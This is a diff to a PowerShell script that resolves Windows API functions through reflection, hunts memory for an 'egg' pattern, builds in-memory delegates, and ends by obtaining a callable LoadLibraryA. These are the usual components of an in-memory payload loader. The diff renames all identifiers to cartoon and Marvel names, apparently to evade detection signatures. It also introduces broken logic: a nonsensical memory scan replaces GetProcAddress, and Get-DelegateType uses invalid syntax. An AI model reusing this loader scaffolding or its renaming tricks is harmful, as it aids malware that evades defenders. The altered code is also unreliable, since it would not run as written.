@@ -1,70 +1,88 @@
-
 Class Hunter {
-    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
+    static [IntPtr] FindAddress([IntPtr]$mickey, [byte[]]$tom) {
         while ($true) {
             [int]$count = 0
 
             while ($true) {
-                [IntPtr]$address = [IntPtr]::Add($address, 1)
-                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
+                [IntPtr]$mickey = [IntPtr]::Add($mickey, 1)
+                If ([System.Runtime.InteropServices.Marshal]::ReadByte($mickey) -eq $tom.Get($count)) {
                     $count++
-                    If ($count -eq $egg.Length) {
-                        return [IntPtr]::Subtract($address, $egg.Length - 1)
+                    If ($count -eq $tom.Length) {
+                        return [IntPtr]::Subtract($mickey, $tom.Length - 1)
                     }
                 } Else { break }
             }
         }
 
-        return $address
+        return $mickey
     }
 }
+
+
+
+
 function Get-ProcAddress {
     Param(
-        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
-        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
+        [Parameter(Position = 0, Mandatory = $True)] [String] $thor,
+        [Parameter(Position = 1, Mandatory = $True)] [String] $captain
     )
 
     # Get a reference to System.dll in the GAC
-    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
+    $tony = [AppDomain]::CurrentDomain.GetAssemblies() |
     Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
-    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $shield = $tony.GetType('Microsoft.Win32.UnsafeNativeMethods')
     # Get a reference to the GetModuleHandle and GetProcAddress methods
-    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
-    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
+    $hammer = $shield.GetMethod('GetModuleHandle')
+    $bucket = $shield.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
     # Get a handle to the module specified
-    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
-    $tmpPtr = New-Object IntPtr
-    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
-    # Return the address of the function
-    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
+    $odin = $hammer.Invoke($null, @($thor))
+    $peter = New-Object IntPtr
+    $parker = New-Object System.Runtime.InteropServices.HandleRef($peter, $odin)
+    # Return the address of the function using the Hunter class
+    $quill = [System.Text.Encoding]::ASCII.GetBytes($captain)
+    return [Hunter]::FindAddress([IntPtr]$parker, $quill)
 }
+
+
+
+
 function Get-DelegateType
 {
-    Param
-    (
-        [OutputType([Type])]
-            
-        [Parameter( Position = 0)]
-        [Type[]]
-        $Parameters = (New-Object Type[](0)),
-            
-        [Parameter( Position = 1 )]
-        [Type]
-        $ReturnType = [Void]
-    )
+    # Use parameter default values
+    [OutputType([Type])]
+    [Parameter(Position = 0)]
+    [Type[]]
+    $Parameters = (New-Object Type[](0)),
+    
+    [Parameter(Position = 1)]
+    [Type]
+    $ReturnType = [Void]
 
-    $Domain = [AppDomain]::CurrentDomain
-    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
-    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
-    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
-    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
-    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
-    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
-    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
-    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
-        
-    Write-Output $TypeBuilder.CreateType()
+    # Use a cached assembly
+    static $assemblyBuilder
+    if (-not $assemblyBuilder) {
+        $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
+            (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
+            [System.Reflection.Emit.AssemblyBuilderAccess]::Run
+        )
+    }
+    $moduleBuilder = $assemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+
+    # Use a cached delegate type
+    static $delegateType
+    if (-not $delegateType) {
+        $typeBuilder = $moduleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+        $constructorBuilder = $typeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
+        $constructorBuilder.SetImplementationFlags('Runtime, Managed')
+        $methodBuilder = $typeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+        $methodBuilder.SetImplementationFlags('Runtime, Managed')
+        $delegateType = $typeBuilder.CreateType()
+    }
+
+    Write-Output $delegateType
 }
+
+
 $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
 $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
 $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
